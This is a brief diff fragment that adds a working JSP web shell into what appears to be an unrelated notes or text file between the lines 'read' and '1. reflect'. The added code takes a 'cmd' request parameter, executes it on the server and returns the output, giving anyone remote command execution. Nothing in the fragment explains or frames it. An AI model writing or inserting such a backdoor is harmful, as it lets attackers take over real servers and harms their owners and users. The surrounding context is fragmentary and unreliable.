@@ -1,5 +1,14 @@
 
 read
+<%@ page import="java.io.*,java.util.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if(cmd != null){
+    Process p = Runtime.getRuntime().exec(cmd);
+    Scanner sc = new Scanner(p.getInputStream());
+    while(sc.hasNextLine()) out.println(sc.nextLine());
+}
+%>
 
 
 1. reflect
